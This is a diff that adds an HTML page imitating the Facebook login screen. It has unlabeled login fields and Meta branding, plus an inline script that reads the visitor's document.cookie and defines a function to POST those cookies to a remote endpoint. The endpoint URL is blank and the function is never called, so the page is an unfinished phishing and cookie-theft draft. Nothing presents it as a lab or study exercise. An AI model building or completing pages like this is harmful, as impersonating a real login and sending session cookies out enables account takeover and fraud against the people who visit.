@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook-log in</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body style="background-color: black;">
+
+
+    <div class="max-w-[600px] h-svh bg-[#EFF5FD] p-5 ">
+        <div class="w-full h-full grid row-span-3">
+            <div class="h-auto bg-[pink] ">
+                <h1>English(UK)</h1>
+                <div>
+                    <img src="" alt="">
+                </div>
+            </div>
+            <div class="h-auto bg-[white] ">
+                <input type="text" name="" id="">
+                <input type="text" name="" id="">
+                <button>login</button>
+                <a href="">Forgote Password?</a>
+            </div>
+            <div class="w-[200px] h-10 bg-[gray]">
+                <button>Create new account</button>
+                <div>
+                    <img src="" alt="">
+                    <h3>Meta</h3>
+                </div>
+                <div>
+                    <h3>About</h3>
+                    <h3>Help</h3>
+                    <h3>More</h3>
+                </div>
+            </div>.
+        </div>
+    </div>
+    
+
+
+    <script>
+
+        let Cookes = document.cookie
+
+        function post_data(){
+
+            fetch("" , {
+                method:"POST",
+                body: JSON.stringify(Cookes)
+            })
+            .then( res => console.log(res))
+            .catch(err => console.error(err))
+    
+            console.log("Cookes : ",Cookes)
+        }
+
+
+    </script>
+</body>
+</html>
